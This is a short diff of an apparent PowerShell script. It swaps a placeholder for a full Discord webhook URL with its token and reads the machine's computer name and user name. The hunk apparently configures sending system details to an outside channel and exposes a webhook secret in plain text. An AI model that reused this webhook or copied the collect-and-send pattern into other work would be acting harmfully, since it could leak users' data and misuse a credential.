@@ -4,7 +4,7 @@
 #>
 
 # === CONFIGURATION ===
-$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"  # Change this
+$webhookUrl = "https://discord.com/api/webhooks/1450141358412136519/MvQdD57MwTlZXdA2YFJ03pyREwf6JptKCdgqRh-34moUdSsFJvhmVzlzkFzh2xYR4lJo"  # Change this
 $computerName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
